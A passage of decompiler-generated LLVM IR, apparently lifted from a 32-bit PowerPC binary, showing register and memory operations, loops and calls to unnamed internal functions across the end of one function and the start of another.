  %v3_10003794 = add i32 %v2_10003794, 4
  %v4_10003794 = inttoptr i32 %v3_10003794 to i16*
  store i16 %v1_10003794, i16* %v4_10003794, align 2
  %v1_10003798 = load i32, i32* @r31, align 4
  %v2_10003798 = inttoptr i32 %v1_10003798 to i32*
  store i32 %v1_10003790, i32* %v2_10003798, align 4
  %v0_1000379c = load i32, i32* %r26.global-to-local, align 4
  %v1_1000379c = trunc i32 %v0_1000379c to i16
  %v2_1000379c = load i32, i32* @r31, align 4
  %v3_1000379c = add i32 %v2_1000379c, 2
  %v4_1000379c = inttoptr i32 %v3_1000379c to i16*
  store i16 %v1_1000379c, i16* %v4_1000379c, align 2
  store i32 %v4_100037a0, i32* %r9.global-to-local, align 4
  %v2_100037a4 = load i32, i32* @r31, align 4
  %v3_100037a4 = add i32 %v2_100037a4, 1
  %v4_100037a4 = inttoptr i32 %v3_100037a4 to i8*
  store i8 %v5_100033c8, i8* %v4_100037a4, align 1
  store i32 %v4_100037a8, i32* %r0.global-to-local, align 4
  %v2_100037ac = load i32, i32* @r31, align 4
  %v3_100037ac = add i32 %v2_100037ac, 8
  %v4_100037ac = inttoptr i32 %v3_100037ac to i8*
  store i8 %v5_10003400, i8* %v4_100037ac, align 1
  %v0_100037b0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100037b0, label %dec_label_pc_100037bc, label %dec_label_pc_100037b4

dec_label_pc_100037b4:                            ; preds = %dec_label_pc_1000372c
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_100037b8 = load i32, i32* @r31, align 4
  %v3_100037b8 = add i32 %v2_100037b8, 6
  %v4_100037b8 = inttoptr i32 %v3_100037b8 to i16*
  store i16 16384, i16* %v4_100037b8, align 2
  br label %dec_label_pc_100037bc

dec_label_pc_100037bc:                            ; preds = %dec_label_pc_1000372c, %dec_label_pc_100037b4
  %v2_100037c4 = load i32, i32* @r31, align 4
  %v3_100037c4 = add i32 %v2_100037c4, 9
  %v4_100037c4 = inttoptr i32 %v3_100037c4 to i8*
  store i8 6, i8* %v4_100037c4, align 1
  %v3_100037c8 = load i32, i32* @global_var_1001eb10.71, align 4
  store i32 %v3_100037c8, i32* %r0.global-to-local, align 4
  %v1_100037cc = load i32, i32* @r31, align 4
  %v2_100037cc = add i32 %v1_100037cc, 12
  %v3_100037cc = inttoptr i32 %v2_100037cc to i32*
  store i32 %v3_100037c8, i32* %v3_100037cc, align 4
  %v3_100037d0 = load i32, i32* %stack_var_-408, align 4
  %v1_100037d4 = mul i32 %v3_100037d0, 16
  store i32 %v1_100037d4, i32* %r9.global-to-local, align 4
  %v1_100037d8 = load i32, i32* %r22.global-to-local, align 4
  %v2_100037d8 = add i32 %v1_100037d8, %v1_100037d4
  %v3_100037d8 = inttoptr i32 %v2_100037d8 to i32*
  %v4_100037d8 = load i32, i32* %v3_100037d8, align 4
  store i32 %v4_100037d8, i32* %r0.global-to-local, align 4
  store i32 %v2_100037d8, i32* %r9.global-to-local, align 4
  %v1_100037e0 = add i32 %v2_100037d8, 12
  %v2_100037e0 = inttoptr i32 %v1_100037e0 to i16*
  %v3_100037e0 = load i16, i16* %v2_100037e0, align 2
  %v4_100037e0 = zext i16 %v3_100037e0 to i32
  store i32 %v4_100037e0, i32* %r11.global-to-local, align 4
  %v1_100037e4 = load i32, i32* @r31, align 4
  %v2_100037e4 = add i32 %v1_100037e4, 16
  %v3_100037e4 = inttoptr i32 %v2_100037e4 to i32*
  store i32 %v4_100037d8, i32* %v3_100037e4, align 4
  %v0_100037e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100037e8 = trunc i32 %v0_100037e8 to i16
  %v2_100037e8 = load i32, i32* @r31, align 4
  %v3_100037e8 = add i32 %v2_100037e8, 20
  %v4_100037e8 = inttoptr i32 %v3_100037e8 to i16*
  store i16 %v1_100037e8, i16* %v4_100037e8, align 2
  %v0_100037ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100037ec = add i32 %v0_100037ec, 8
  %v2_100037ec = inttoptr i32 %v1_100037ec to i32*
  %v3_100037ec = load i32, i32* %v2_100037ec, align 4
  store i32 %v3_100037ec, i32* %r0.global-to-local, align 4
  %v0_100037f0 = load i32, i32* @r30, align 4
  %v1_100037f0 = add i32 %v0_100037f0, 12
  %v2_100037f0 = inttoptr i32 %v1_100037f0 to i32*
  %v3_100037f0 = load i32, i32* %v2_100037f0, align 4
  store i32 %v3_100037f0, i32* %r11.global-to-local, align 4
  %v2_100037f4 = add i32 %v0_100037f0, 4
  %v3_100037f4 = inttoptr i32 %v2_100037f4 to i32*
  store i32 %v3_100037ec, i32* %v3_100037f4, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_100037fc = call i32 @__asm_rlwimi(i32 8, i32 28, i32 0, i32 3)
  store i32 %v1_100037fc, i32* %r11.global-to-local, align 4
  %v0_10003800 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003800 = add i32 %v0_10003800, 14
  %v2_10003800 = inttoptr i32 %v1_10003800 to i16*
  %v3_10003800 = load i16, i16* %v2_10003800, align 2
  %v4_10003800 = zext i16 %v3_10003800 to i32
  store i32 %v4_10003800, i32* %r0.global-to-local, align 4
  %v1_10003804 = add i32 %v0_10003800, 4
  %v2_10003804 = inttoptr i32 %v1_10003804 to i32*
  %v3_10003804 = load i32, i32* %v2_10003804, align 4
  store i32 %v3_10003804, i32* %r10.global-to-local, align 4
  %v1_10003808 = or i32 %v1_100037fc, 1114112
  store i32 %v1_10003808, i32* %r11.global-to-local, align 4
  %v2_1000380c = load i32, i32* @r30, align 4
  %v3_1000380c = add i32 %v2_1000380c, 2
  %v4_1000380c = inttoptr i32 %v3_1000380c to i16*
  store i16 %v3_10003800, i16* %v4_1000380c, align 2
  %v0_10003810 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003810 = load i32, i32* @r30, align 4
  %v2_10003810 = add i32 %v1_10003810, 8
  %v3_10003810 = inttoptr i32 %v2_10003810 to i32*
  store i32 %v0_10003810, i32* %v3_10003810, align 4
  %v0_10003814 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003814 = load i32, i32* @r30, align 4
  %v2_10003814 = add i32 %v1_10003814, 12
  %v3_10003814 = inttoptr i32 %v2_10003814 to i32*
  store i32 %v0_10003814, i32* %v3_10003814, align 4
  %v0_10003818 = call i32 @function_10007ca8()
  %v1_10003818 = trunc i32 %v0_10003818 to i16
  store i32 %v1_10003450, i32* %r9.global-to-local, align 4
  %v3_10003820 = load i32, i32* @r30, align 4
  %v4_10003820 = add i32 %v3_10003820, 14
  %v5_10003820 = inttoptr i32 %v4_10003820 to i16*
  store i16 %v1_10003818, i16* %v5_10003820, align 2
  %v0_10003824 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003824, i32* @r4, align 4
  %v0_10003828 = load i32, i32* @r31, align 4
  %v1_10003828 = add i32 %v0_10003828, 40
  store i32 %v1_10003828, i32* @r3, align 4
  %v0_1000382c = load i32, i32* @r30, align 4
  %v1_1000382c = add i32 %v0_1000382c, 12
  %v2_1000382c = inttoptr i32 %v1_1000382c to i32*
  %v3_1000382c = load i32, i32* %v2_1000382c, align 4
  store i32 %v3_1000382c, i32* %r0.global-to-local, align 4
  %v1_10003830 = call i32 @__asm_rlwimi(i32 %v1_10003450, i32 21, i32 10, i32 10)
  store i32 %v1_10003830, i32* %r0.global-to-local, align 4
  %v1_10003834 = call i32 @__asm_rlwimi(i32 %v1_10003474, i32 20, i32 11, i32 11)
  store i32 %v1_10003834, i32* %r0.global-to-local, align 4
  %v1_10003838 = call i32 @__asm_rlwimi(i32 %v1_1000348c, i32 19, i32 12, i32 12)
  store i32 %v1_10003838, i32* %r0.global-to-local, align 4
  %v1_1000383c = call i32 @__asm_rlwimi(i32 %v1_100034a4, i32 18, i32 13, i32 13)
  store i32 %v1_1000383c, i32* %r0.global-to-local, align 4
  %v1_10003840 = call i32 @__asm_rlwimi(i32 %v1_100034bc, i32 17, i32 14, i32 14)
  store i32 %v1_10003840, i32* %r0.global-to-local, align 4
  %v1_10003844 = call i32 @__asm_rlwimi(i32 %v1_100034d4, i32 16, i32 15, i32 15)
  store i32 %v1_10003844, i32* %r0.global-to-local, align 4
  %v1_10003848 = load i32, i32* @r30, align 4
  %v2_10003848 = add i32 %v1_10003848, 12
  %v3_10003848 = inttoptr i32 %v2_10003848 to i32*
  store i32 %v1_10003844, i32* %v3_10003848, align 4
  %v0_1000384c = call i32 @function_10007ed4()
  store i32 %v0_1000384c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003850

dec_label_pc_10003850:                            ; preds = %dec_label_pc_10003560, %dec_label_pc_100037bc
  %v3_10003850 = load i32, i32* %stack_var_-408, align 4
  %v1_10003854 = add i32 %v3_10003850, 1
  store i32 %v1_10003854, i32* %r9.global-to-local, align 4
  %v1_10003858 = load i32, i32* %r21.global-to-local, align 4
  %v2_10003858 = icmp slt i32 %v1_10003854, %v1_10003858
  %v4_10003858 = icmp eq i32 %v1_10003854, %v1_10003858
  store i1 %v4_10003858, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003854, i32* %stack_var_-408, align 4
  br i1 %v2_10003858, label %dec_label_pc_1000355c, label %dec_label_pc_10003864.loopexit

dec_label_pc_10003864.loopexit:                   ; preds = %dec_label_pc_10003850
  %v0_10003870.pre.pre = load i1, i1* %cr3_eq.global-to-local, align 1
  %v1_10003870.pre.pre = load i1, i1* %cr3_lt.global-to-local, align 1
  br label %dec_label_pc_10003864

dec_label_pc_10003864:                            ; preds = %dec_label_pc_10003864.loopexit, %dec_label_pc_1000353c
  %v1_10003870.pre = phi i1 [ %v1_10003870.pre.pre, %dec_label_pc_10003864.loopexit ], [ %v1_1000353c, %dec_label_pc_1000353c ]
  %v0_10003870.pre = phi i1 [ %v0_10003870.pre.pre, %dec_label_pc_10003864.loopexit ], [ %v3_1000353c, %dec_label_pc_1000353c ]
  %v0_10003864 = load i32, i32* %r27.global-to-local, align 4
  %v3_10003864 = icmp eq i32 %v0_10003864, 0
  store i1 %v3_10003864, i1* %cr2_eq.global-to-local, align 1
  %v0_10003868 = load i32, i32* %r25.global-to-local, align 4
  %v1_10003868 = add i32 %v0_10003868, 40
  store i32 %v1_10003868, i32* %r26.global-to-local, align 4
  %v1_1000386c = add i32 %v0_10003868, 20
  store i32 %v1_1000386c, i32* @r31, align 4
  br label %dec_label_pc_10003870.outer

dec_label_pc_10003870.outer:                      ; preds = %dec_label_pc_10003944, %dec_label_pc_10003864
  %v1_10003870.ph = phi i1 [ %v1_10003870.pre, %dec_label_pc_10003864 ], [ %v1_10003944, %dec_label_pc_10003944 ]
  %v0_10003870.ph = phi i1 [ %v0_10003870.pre, %dec_label_pc_10003864 ], [ %v0_10003944, %dec_label_pc_10003944 ]
  %v2_10003870 = or i1 %v1_10003870.ph, %v0_10003870.ph
  br label %dec_label_pc_10003870

dec_label_pc_10003870:                            ; preds = %dec_label_pc_10003870.outer, %dec_label_pc_10003870
  br i1 %v2_10003870, label %dec_label_pc_10003870, label %dec_label_pc_10003874

dec_label_pc_10003874:                            ; preds = %dec_label_pc_10003870, %dec_label_pc_10003944
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-408, align 4
  %v0_10003884 = load i32, i32* %r19.global-to-local, align 4
  %v4_10003884 = icmp eq i32 %v0_10003884, 65535
  store i1 %v4_10003884, i1* %cr4_eq.global-to-local, align 1
  %v0_10003888 = load i32, i32* @r31, align 4
  %v1_10003888 = urem i32 %v0_10003888, 65536
  store i32 %v1_10003888, i32* @r30, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10003894

dec_label_pc_10003894:                            ; preds = %dec_label_pc_100038b0.dec_label_pc_10003894_crit_edge, %dec_label_pc_10003874
  %v0_100038a0 = phi i1 [ %v0_100038a0.pre, %dec_label_pc_100038b0.dec_label_pc_10003894_crit_edge ], [ %v4_10003884, %dec_label_pc_10003874 ]
  %v0_10003894 = phi i32 [ %v1_10003934, %dec_label_pc_100038b0.dec_label_pc_10003894_crit_edge ], [ 0, %dec_label_pc_10003874 ]
  %v1_10003894 = mul i32 %v0_10003894, 4
  store i32 %v1_10003894, i32* %r0.global-to-local, align 4
  %v0_10003898 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003898 = add i32 %v0_10003898, %v1_10003894
  %v3_10003898 = inttoptr i32 %v2_10003898 to i32*
  %v4_10003898 = load i32, i32* %v3_10003898, align 4
  store i32 %v4_10003898, i32* @r29, align 4
  %v1_1000389c = add i32 %v4_10003898, 20
  store i32 %v1_1000389c, i32* %r28.global-to-local, align 4
  br i1 %v0_100038a0, label %dec_label_pc_1000394c, label %dec_label_pc_100038a4

dec_label_pc_100038a4:                            ; preds = %dec_label_pc_10003894
  %v1_100038a4 = add i32 %v4_10003898, 40
  store i32 %v1_100038a4, i32* @r3, align 4
  %v0_100038a8 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100038a8, i32* @r4, align 4
  %v0_100038ac = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100038ac, label %dec_label_pc_100038b0, label %dec_label_pc_10003960

dec_label_pc_100038b0:                            ; preds = %dec_label_pc_100038a4, %dec_label_pc_1000394c, %dec_label_pc_10003960
  %v2_100038b0 = phi i32 [ %v4_10003898, %dec_label_pc_100038a4 ], [ %v0_10003958, %dec_label_pc_1000394c ], [ %v2_100038b0.pre, %dec_label_pc_10003960 ]
  %v0_100038b0 = load i32, i32* %r27.global-to-local, align 4
  %v1_100038b0 = trunc i32 %v0_100038b0 to i16
  %v3_100038b0 = add i32 %v2_100038b0, 10
  %v4_100038b0 = inttoptr i32 %v3_100038b0 to i16*
  store i16 %v1_100038b0, i16* %v4_100038b0, align 2
  %v0_100038b8 = load i32, i32* @r29, align 4
  store i32 %v0_100038b8, i32* @r3, align 4
  %v2_100038bc = call i32 @function_100060d4(i32 %v0_100038b8, i32 20)
  %v3_100038bc = trunc i32 %v2_100038bc to i16
  store i32 %v2_100038bc, i32* %r3.global-to-local, align 4
  %v3_100038c0 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_100038c0, i32* %r9.global-to-local, align 4
  %v3_100038c4 = load i32, i32* @r29, align 4
  %v4_100038c4 = add i32 %v3_100038c4, 10
  %v5_100038c4 = inttoptr i32 %v4_100038c4 to i16*
  store i16 %v3_100038bc, i16* %v5_100038c4, align 2
  %v0_100038c8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100038c8, i32* @r4, align 4
  %v0_100038cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100038cc = mul i32 %v0_100038cc, 16
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v0_100038d0 = load i32, i32* %r27.global-to-local, align 4
  %v1_100038d0 = trunc i32 %v0_100038d0 to i16
  %v3_100038d0 = add i32 %v0_100038c8, 16
  %v4_100038d0 = inttoptr i32 %v3_100038d0 to i16*
  store i16 %v1_100038d0, i16* %v4_100038d0, align 2
  %v0_100038d4 = load i32, i32* %r22.global-to-local, align 4
  %v1_100038d4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100038d4 = add i32 %v1_100038d4, %v0_100038d4
  store i32 %v2_100038d4, i32* %r9.global-to-local, align 4
  %v0_100038d8 = load i32, i32* @r30, align 4
  %v1_100038dc = add i32 %v2_100038d4, 4
  %v2_100038dc = inttoptr i32 %v1_100038dc to i32*
  %v3_100038dc = load i32, i32* %v2_100038dc, align 4
  store i32 %v3_100038dc, i32* %r11.global-to-local, align 4
  %v0_100038e0 = load i32, i32* @r31, align 4
  %v0_100038e4 = load i32, i32* @r29, align 4
  store i32 %v0_100038e4, i32* %r3.global-to-local, align 4
  %v1_100038e8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100038e8 = add i32 %v1_100038e8, 4
  %v3_100038e8 = inttoptr i32 %v2_100038e8 to i32*
  store i32 %v3_100038dc, i32* %v3_100038e8, align 4
  %v0_100038ec = load i32, i32* %r11.global-to-local, align 4
  %v1_100038ec = add i32 %v0_100038ec, 1
  store i32 %v1_100038ec, i32* %r11.global-to-local, align 4
  %v1_100038f0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100038f0 = add i32 %v1_100038f0, 4
  %v3_100038f0 = inttoptr i32 %v2_100038f0 to i32*
  store i32 %v1_100038ec, i32* %v3_100038f0, align 4
  %v0_100038f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100038f4 = add i32 %v0_100038f4, 8
  %v2_100038f4 = inttoptr i32 %v1_100038f4 to i32*
  %v3_100038f4 = load i32, i32* %v2_100038f4, align 4
  store i32 %v3_100038f4, i32* %r0.global-to-local, align 4
  %v1_100038f8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100038f8 = add i32 %v1_100038f8, 8
  %v3_100038f8 = inttoptr i32 %v2_100038f8 to i32*
  store i32 %v3_100038f4, i32* %v3_100038f8, align 4
  %v4_100038fc = call i32 @function_10006138(i32 %v0_100038e4, i32 %v0_100038c8, i32 %v0_100038d8, i32 %v0_100038e0)
  %v5_100038fc = trunc i32 %v4_100038fc to i16
  store i32 %v4_100038fc, i32* %r3.global-to-local, align 4
  %v3_10003900 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003900, i32* %r7.global-to-local, align 4
  %v0_10003904 = load i32, i32* %r28.global-to-local, align 4
  %v1_10003904 = add i32 %v0_10003904, 2
  %v2_10003904 = inttoptr i32 %v1_10003904 to i16*
  %v3_10003904 = load i16, i16* %v2_10003904, align 2
  %v4_10003904 = zext i16 %v3_10003904 to i32
  store i32 %v4_10003904, i32* %r0.global-to-local, align 4
  %v0_10003908 = load i32, i32* @r29, align 4
  %v1_1000390c = mul i32 %v3_10003900, 24
  store i32 %v1_1000390c, i32* %r7.global-to-local, align 4
  %v4_10003910 = add i32 %v0_10003904, 16
  %v5_10003910 = inttoptr i32 %v4_10003910 to i16*
  store i16 %v5_100038fc, i16* %v5_10003910, align 2
  %v0_10003914 = load i32, i32* %r26.global-to-local, align 4
  %v0_10003918 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10003918, i32* %r3.global-to-local, align 4
  %v0_1000391c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000391c = load i32, i32* %r20.global-to-local, align 4
  %v2_1000391c = add i32 %v1_1000391c, %v0_1000391c
  store i32 %v2_1000391c, i32* %r7.global-to-local, align 4
  %v0_10003924 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003924 = trunc i32 %v0_10003924 to i16
  %v3_10003924 = add i32 %v2_1000391c, 2
  %v4_10003924 = inttoptr i32 %v3_10003924 to i16*
  store i16 %v1_10003924, i16* %v4_10003924, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268450096, i32* @lr, align 4
  %v6_1000392c = call i32 @function_1000c140(i32 %v0_10003918, i32 %v0_10003908, i32 %v0_10003914, i32 16384, i32 %v2_1000391c, i32 16)
  store i32 %v6_1000392c, i32* %r3.global-to-local, align 4
  %v3_10003930 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003930, i32* %r9.global-to-local, align 4
  %v1_10003934 = add i32 %v3_10003930, 1
  store i32 %v1_10003934, i32* %r0.global-to-local, align 4
  %v1_10003938 = load i32, i32* %r21.global-to-local, align 4
  %v2_10003938 = icmp slt i32 %v1_10003934, %v1_10003938
  %v4_10003938 = icmp eq i32 %v1_10003934, %v1_10003938
  store i1 %v4_10003938, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003934, i32* %stack_var_-408, align 4
  br i1 %v2_10003938, label %dec_label_pc_100038b0.dec_label_pc_10003894_crit_edge, label %dec_label_pc_10003944

dec_label_pc_100038b0.dec_label_pc_10003894_crit_edge: ; preds = %dec_label_pc_100038b0
  %v0_100038a0.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  br label %dec_label_pc_10003894

dec_label_pc_10003944:                            ; preds = %dec_label_pc_100038b0
  %v0_10003944 = load i1, i1* %cr3_eq.global-to-local, align 1
  %v1_10003944 = load i1, i1* %cr3_lt.global-to-local, align 1
  %v2_10003944 = or i1 %v0_10003944, %v1_10003944
  br i1 %v2_10003944, label %dec_label_pc_10003870.outer, label %dec_label_pc_10003874

dec_label_pc_1000394c:                            ; preds = %dec_label_pc_10003894
  %v0_1000394c = call i32 @function_10007ca8()
  %v1_1000394c = trunc i32 %v0_1000394c to i16
  %v0_10003950 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003950, i32* @r4, align 4
  %v3_10003954 = load i32, i32* @r29, align 4
  %v4_10003954 = add i32 %v3_10003954, 4
  %v5_10003954 = inttoptr i32 %v4_10003954 to i16*
  store i16 %v1_1000394c, i16* %v5_10003954, align 2
  %v0_10003958 = load i32, i32* @r29, align 4
  %v1_10003958 = add i32 %v0_10003958, 40
  store i32 %v1_10003958, i32* @r3, align 4
  %v0_1000395c = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_1000395c, label %dec_label_pc_100038b0, label %dec_label_pc_10003960

dec_label_pc_10003960:                            ; preds = %dec_label_pc_100038a4, %dec_label_pc_1000394c
  %v0_10003960 = call i32 @function_10007ed4()
  store i32 %v0_10003960, i32* %r3.global-to-local, align 4
  %v2_100038b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100038b0

; uselistorder directives
  uselistorder i32 %v0_10003958, { 1, 0 }
  uselistorder i1 %v1_10003944, { 1, 0 }
  uselistorder i1 %v0_10003944, { 1, 0 }
  uselistorder i32 %v1_10003934, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_100038fc, { 1, 0 }
  uselistorder i32 %v0_100038c8, { 1, 0, 2 }
  uselistorder i32 %v2_100038bc, { 1, 0 }
  uselistorder i32 %v1_10003894, { 1, 0 }
  uselistorder i32 %v1_10003854, { 0, 2, 1, 3 }
  uselistorder i32 %v2_100037d8, { 1, 0, 2 }
  uselistorder i32 %v1_100037d4, { 1, 0 }
  uselistorder i32 %v1_1000376c, { 1, 0 }
  uselistorder i32 %v1_10003738, { 1, 0 }
  uselistorder i32 %v0_100036b8, { 1, 0 }
  uselistorder i32 %v2_100036ac, { 1, 2, 0 }
  uselistorder i1 %v4_10003630, { 1, 0 }
  uselistorder i16 %storemerge, { 1, 0 }
  uselistorder i32 %v3_10003690, { 1, 3, 0, 2 }
  uselistorder i32 %v1_1000366c, { 1, 0 }
  uselistorder i32 %v1_10003414, { 1, 0 }
  uselistorder i8 %v5_10003400, { 1, 0 }
  uselistorder i8 %v5_100033c8, { 1, 0 }
  uselistorder i16 %tmp13, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 29, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0, 1 }
  uselistorder i32* %r25.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r24.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cr3_eq.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003960, { 1, 0 }
  uselistorder label %dec_label_pc_100038b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003874, { 1, 0 }
  uselistorder label %dec_label_pc_10003870, { 1, 0 }
  uselistorder label %dec_label_pc_10003850, { 1, 0 }
  uselistorder label %dec_label_pc_100037bc, { 1, 0 }
  uselistorder label %dec_label_pc_100036cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000364c, { 1, 2, 0 }
}

define i32 @function_10003968(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10003968:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr3_lt.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i16 @__decompiler_undefined_function_1()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-384 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %v0_1000396c = load i32, i32* @lr, align 4
  store i32 %v0_1000396c, i32* %r0.global-to-local, align 4
  %v0_10003970 = call i32 @__asm_mfcr()
  store i32 %v0_10003970, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r20.global-to-local, align 4
  %v0_10003980 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10003970, i32* %r21.global-to-local, align 4
  %v0_100039b8 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_100039c0 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 268450268, i32* @lr, align 4
  %v2_100039d8 = call i32 @function_1000c548(i32 16, i32 16)
  store i32 %v2_100039d8, i32* %r22.global-to-local, align 4
  %v0_100039e4 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100039e4, i32* %r3.global-to-local, align 4
  store i32 268450284, i32* @lr, align 4
  %v2_100039e8 = call i32 @function_1000c548(i32 %v0_100039e4, i32 4)
  %v0_100039ec = load i32, i32* @r28, align 4
  store i32 %v2_100039e8, i32* %r23.global-to-local, align 4
  %v0_100039fc = load i32, i32* @r29, align 4
  store i32 %v0_100039fc, i32* %r3.global-to-local, align 4
  store i32 268450308, i32* @lr, align 4
  %v4_10003a00 = inttoptr i32 %v0_100039ec to i32*
  %v5_10003a00 = call i32 @function_1000235c(i32 %v0_100039fc, i32* %v4_10003a00, i32 2, i32 0)
  %v5_10003a10 = trunc i32 %v5_10003a00 to i8
  %v0_10003a18 = load i32, i32* @r28, align 4
  %v0_10003a1c = load i32, i32* @r29, align 4
  store i32 %v0_10003a1c, i32* %r3.global-to-local, align 4
  store i32 268450340, i32* @lr, align 4
  %v4_10003a20 = inttoptr i32 %v0_10003a18 to i32*
  %v5_10003a20 = call i32 @function_1000235c(i32 %v0_10003a1c, i32* %v4_10003a20, i32 3, i32 65535)
  %v0_10003a24 = load i32, i32* @r28, align 4
  store i32 %v5_10003a20, i32* @r31, align 4
  %v0_10003a34 = load i32, i32* @r29, align 4
  store i32 %v0_10003a34, i32* %r3.global-to-local, align 4
  store i32 268450364, i32* @lr, align 4
  %v4_10003a38 = inttoptr i32 %v0_10003a24 to i32*
  %v5_10003a38 = call i32 @function_1000235c(i32 %v0_10003a34, i32* %v4_10003a38, i32 4, i32 64)
  %v0_10003a3c = load i32, i32* @r28, align 4
  %v5_10003a48 = trunc i32 %v5_10003a38 to i8
  %v0_10003a50 = load i32, i32* @r29, align 4
  store i32 %v0_10003a50, i32* %r3.global-to-local, align 4
  store i32 268450392, i32* @lr, align 4
  %v4_10003a54 = inttoptr i32 %v0_10003a3c to i32*
  %v5_10003a54 = call i32 @function_1000235c(i32 %v0_10003a50, i32* %v4_10003a54, i32 5, i32 1)
  %v1_10003a5c = urem i32 %v5_10003a54, 256
  %v0_10003a68 = load i32, i32* @r28, align 4
  %v0_10003a70 = load i32, i32* @r29, align 4
  store i32 %v0_10003a70, i32* %r3.global-to-local, align 4
  store i32 268450424, i32* @lr, align 4
  %v4_10003a74 = inttoptr i32 %v0_10003a68 to i32*
  %v5_10003a74 = call i32 @function_1000235c(i32 %v0_10003a70, i32* %v4_10003a74, i32 7, i32 65535)
  %v0_10003a78 = load i32, i32* @r28, align 4
  %v5_10003a84 = trunc i32 %v5_10003a74 to i16
  %v0_10003a8c = load i32, i32* @r29, align 4
  store i32 %v0_10003a8c, i32* %r3.global-to-local, align 4
  store i32 268450452, i32* @lr, align 4
  %v4_10003a90 = inttoptr i32 %v0_10003a78 to i32*
  %v5_10003a90 = call i32 @function_1000235c(i32 %v0_10003a8c, i32* %v4_10003a90, i32 11, i32 1)
  %v0_10003a94 = load i32, i32* @r28, align 4
  %v1_10003a98 = urem i32 %v5_10003a90, 256
  %v0_10003aa8 = load i32, i32* @r29, align 4
  store i32 %v0_10003aa8, i32* %r3.global-to-local, align 4
  store i32 268450480, i32* @lr, align 4
  %v4_10003aac = inttoptr i32 %v0_10003a94 to i32*
  %v5_10003aac = call i32 @function_1000235c(i32 %v0_10003aa8, i32* %v4_10003aac, i32 12, i32 1)
  %v0_10003ab0 = load i32, i32* @r28, align 4
  %v1_10003abc = urem i32 %v5_10003aac, 256
